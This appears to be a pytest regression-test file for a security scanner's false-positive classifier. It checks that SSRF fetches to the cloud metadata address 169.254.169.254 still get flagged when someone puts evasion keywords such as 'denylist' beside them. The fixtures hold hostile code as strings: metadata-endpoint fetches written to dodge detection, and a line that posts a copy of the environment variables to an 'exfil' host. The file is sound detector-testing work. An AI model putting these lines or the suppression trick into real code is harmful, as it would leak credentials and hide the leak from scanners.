"""Security-audit regression tests — group H-fp-classifier.

Covers three red-team findings against the opt-in FP/TP classifier
(`scripts/cpv_fp_classifier.py` + `scripts/cpv_fp_classifier_rules.py`):

* ``G6-rc65-pattern-source-substring-shapeable`` (LOW, FN-unsafe shape) —
  RC-65's same-line (and surrounding-line) pattern-source guard was a
  bare substring scan checked BEFORE the network-call check. An attacker
  making a genuine IMDS fetch could drop a benign token (``denylist``,
  ``blocklist``, ``# _PATTERNS``) onto the line to force ``DEFINITE_FP``
  and silence the SSRF. Fix: a URL-positioned IMDS literal (a structural
  request target) can no longer be cleared by a co-located benign keyword;
  the benign cases the guard exists for (a bare set member / default
  value, which are NOT URL-positioned) still clear.

* ``G6-file-role-of-dup-impl-drift`` (NIT) — ``file_role_of`` duplicates
  the role taxonomy of the authoritative live ``_file_role_from_path``.
  No FN today (bench-only); the fix annotates the boundary so a future
  contributor does not wire the looser heuristic into the live path.

* ``G6-has-sink-nearby-window-boundary`` (LOW) — ``has_sink_nearby``
  recall is bounded by the caller's window; a ``False`` must never be
  trusted as "no sink anywhere". No FN today; the fix documents the
  asymmetry so a future caller does not escalate a ``False`` to
  ``DEFINITE_FP`` on a narrow window.

Every security-relevant assertion is TWO-SIDED: the red-team MALICIOUS
shape now fires (``DEFINITE_TP`` in a source-role file → escalate-eligible
CRITICAL under ``--extreme``), AND the BENIGN case the discriminator was
added to suppress STILL clears (``DEFINITE_FP``).
"""

from __future__ import annotations

import inspect
import sys
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "scripts"))

import cpv_fp_classifier_rules  # noqa: F401,E402  — import registers the classifiers
from cpv_fp_classifier import (  # noqa: E402
    Context,
    FindingVerdict,
    classify_rule,
    file_role_of,
    has_sink_nearby,
)


def _rc65(
    line: str,
    *,
    surrounding: tuple[str, ...] | None = None,
    file_role: str = "source",
    file_path: str = "scripts/imds_client.py",
) -> Context:
    """Build an RC-65 Context. Default surrounding window is the line itself."""
    return Context(
        rule_id="RC-65",
        matched_text="169.254.169.254",
        line_number=1,
        line=line,
        surrounding_lines=surrounding if surrounding is not None else (line,),
        file_role=file_role,
        file_path=file_path,
        plugin_meta={},
    )


# ---------------------------------------------------------------------------
# Finding G6-rc65-pattern-source-substring-shapeable — the core FN fix.
# ---------------------------------------------------------------------------


class TestRc65PatternSourceSubstringShapeable:
    """A co-located benign token must not suppress a URL-positioned IMDS fetch."""

    # --- MALICIOUS side: genuine fetch + benign keyword → must still FIRE. ---

    def test_url_fetch_with_same_line_denylist_comment_still_fires(self) -> None:
        """requests.get of the IMDS URL with a `# denylist` comment → DEFINITE_TP.

        This is the exact red-team shape: a real SSRF where the attacker
        drops a benign `denylist` substring on the same line to force the
        pre-fix same-line pattern-source DEFINITE_FP. The URL-positioned
        literal is a structural request target, so the guard no longer
        clears it.
        """
        ctx = _rc65('requests.get("http://169.254.169.254/latest/meta-data/")  # not in denylist')
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_TP

    def test_url_fetch_with_unused_denylist_identifier_still_fires(self) -> None:
        """Assigning the fetch result to a `denylist`-named var must not suppress."""
        ctx = _rc65('denylist = requests.get("http://169.254.169.254/latest/").text')
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_TP

    def test_port_positioned_fetch_with_blocklist_token_still_fires(self) -> None:
        """A port-positioned IMDS literal (`:80/`) is URL-positioned → DEFINITE_TP."""
        ctx = _rc65('x = requests.get(f"http://169.254.169.254:80/x")  # blocklist')
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_TP

    def test_url_fetch_with_surrounding_denylist_comment_still_fires(self) -> None:
        """A `denylist` token in the SURROUNDING window must not suppress a real fetch.

        The fix gates the surrounding-line pattern-source guard on the same
        structural request-target signal, so an adjacent benign comment can
        no longer clear a URL-positioned fetch.
        """
        line = 'requests.get("http://169.254.169.254/latest/")'
        ctx = _rc65(line, surrounding=("# this host lives in our denylist", line))
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_TP

    def test_bare_accessor_url_positioned_with_denylist_still_fires(self) -> None:
        """A fluent-client accessor (`session.get`) on a URL-positioned literal fires.

        `_RC65_ACCESSOR_CALL_HINTS` (`.get(`) + URL-positioned literal is a
        genuine fetch; a co-located `blocklist` token no longer pre-empts it.
        """
        ctx = _rc65('session.get("http://169.254.169.254/latest/")  # blocklist entry')
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_TP

    # --- BENIGN side: the cases the guard exists for → must STAY DEFINITE_FP. ---

    def test_benign_default_value_with_denylist_keyword_still_clears(self) -> None:
        """A bare default value (NOT URL-positioned) keeps its DEFINITE_FP clear.

        `config.get("blocked_host", "169.254.169.254")` stores the literal as
        a default; it is not a request target, and the `denylist` keyword
        marks the line as a pattern source. The fix must NOT regress this.
        """
        ctx = _rc65('host = config.get("blocked_host", "169.254.169.254")  # denylist default')
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_FP

    def test_benign_same_line_set_member_still_clears(self) -> None:
        """A bare set-member literal with a `denylist` comment still clears."""
        ctx = _rc65('    "169.254.169.254",  # member of denylist')
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_FP

    def test_benign_pattern_const_tuple_still_clears(self) -> None:
        """`IMDS_HOSTS = ("169.254.169.254",)` — a `_HOSTS` const literal clears."""
        ctx = _rc65('IMDS_HOSTS = ("169.254.169.254",)')
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_FP

    def test_benign_surrounding_set_member_still_clears(self) -> None:
        """Literal alone on the line, `blocked_hosts` collection in the window.

        This is the multi-line denylist set case (`blocked_hosts = [` on a
        prior line); the member line is not URL-positioned, so the
        surrounding-line pattern-source guard still clears it.
        """
        ctx = _rc65(
            '    "169.254.169.254",',
            surrounding=("blocked_hosts = [", '    "169.254.169.254",', "]"),
        )
        assert classify_rule("RC-65", ctx) is FindingVerdict.DEFINITE_FP

    # --- Controlled pair: same URL-fetch line, source vs test role. ---

    def test_role_pair_source_escalates_test_does_not(self) -> None:
        """The escalation is role-gated: source → DEFINITE_TP, test → not.

        Both poles of the controlled pair: the identical malicious fetch
        line escalates in a source file but a detector's own test suite
        (which legitimately references IMDS addresses inside `requests.`
        exemplars) does not escalate to DEFINITE_TP.
        """
        line = 'requests.get("http://169.254.169.254/latest/")  # denylist'
        src = _rc65(line, file_role="source", file_path="scripts/imds_client.py")
        assert classify_rule("RC-65", src) is FindingVerdict.DEFINITE_TP

        tst = _rc65(line, file_role="test", file_path="tests/test_ssrf_detector.py")
        assert classify_rule("RC-65", tst) is not FindingVerdict.DEFINITE_TP

    def test_pre_fix_regression_guard_url_fetch_is_not_suppressed(self) -> None:
        """Explicit guard against the PRE-FIX bug: never DEFINITE_FP on a URL fetch.

        Pre-fix, the same-line substring scan returned DEFINITE_FP here
        (the `denylist` token won, before the network-call check). Assert
        the URL-positioned fetch is never suppressed regardless of which
        pattern-source keyword the attacker picks.
        """
        for token in ("denylist", "blocklist", "blacklist", "unsafe_hosts", "_PATTERNS", "DETECT_"):
            ctx = _rc65(f'requests.get("http://169.254.169.254/latest/")  # {token}')
            verdict = classify_rule("RC-65", ctx)
            assert verdict is not FindingVerdict.DEFINITE_FP, f"token={token!r} wrongly suppressed a real fetch"
            assert verdict is FindingVerdict.DEFINITE_TP, f"token={token!r} should escalate the real fetch"


# ---------------------------------------------------------------------------
# Finding G6-file-role-of-dup-impl-drift — docstring/boundary hardening.
# ---------------------------------------------------------------------------


class TestFileRoleOfBoundaryAnnotation:
    """`file_role_of` keeps its behavior and is annotated as non-authoritative."""

    def test_behavior_preserved_core_roles(self) -> None:
        """The heuristic's existing role classification is unchanged by the fix."""
        assert file_role_of("tests/test_foo.py") == "test"
        assert file_role_of("tests/fixtures/sample.py") == "fixture"
        assert file_role_of("docs/intro.md") == "doc"
        assert file_role_of("examples/quickstart.py") == "sample"
        assert file_role_of("src/main.py") == "source"
        # MED #67 word-boundary guard must still hold.
        assert file_role_of("scripts/contest_runner.py") == "source"

    def test_docstring_marks_non_authoritative_and_names_live_helper(self) -> None:
        """Docstring must steer future callers to the authoritative live helper.

        This is the whole point of the NIT fix: prevent drift by making the
        boundary explicit. We assert the load-bearing phrases are present so
        the annotation cannot silently rot away.
        """
        doc = inspect.getdoc(file_role_of) or ""
        assert "_file_role_from_path" in doc, "must name the authoritative live helper"
        lowered = doc.lower()
        assert "not authoritative" in lowered
        assert "not on the live" in lowered or "do not wire this into the live" in lowered
        assert "drift" in lowered


# ---------------------------------------------------------------------------
# Finding G6-has-sink-nearby-window-boundary — window-boundary contract.
# ---------------------------------------------------------------------------


class TestHasSinkNearbyWindowBoundary:
    """`has_sink_nearby` keeps True/False semantics; the boundary is documented."""

    def test_true_when_sink_in_window(self) -> None:
        """A sink hint inside the window returns True (reliable positive)."""
        window = ("env = os.environ.copy()", 'requests.post("https://exfil/", json=env)')
        assert has_sink_nearby(window, ("requests.post",)) is True

    def test_false_when_sink_outside_window(self) -> None:
        """A sink OUTSIDE the supplied window is invisible → returns False.

        This is precisely the boundary the docstring warns about: the False
        is "no sink in THIS window", not "no sink in the file". The caller
        passed a narrow window that omits the real sink line.
        """
        narrow_window = ("env = os.environ.copy()",)  # the exfil sink is NOT in here
        assert has_sink_nearby(narrow_window, ("requests.post",)) is False

    def test_docstring_documents_false_is_window_bounded(self) -> None:
        """The FN-safety contract must be spelled out in the docstring.

        Asserts the load-bearing guidance is present: a False is window-
        bounded and must never be escalated to DEFINITE_FP on a narrow
        window; route False-driven suppression to the taint engine.
        """
        doc = inspect.getdoc(has_sink_nearby) or ""
        lowered = doc.lower()
        assert "window" in lowered
        assert "definite_fp" in lowered, "must warn against escalating a False to DEFINITE_FP"
        assert "taint" in lowered, "must point False-driven suppression at the taint engine"
        # The asymmetry (True reliable / False window-bounded) must be explicit.
        assert "no sink anywhere" in lowered or "not \"no sink in the file\"" in lowered or "not 'no sink in the file'" in lowered
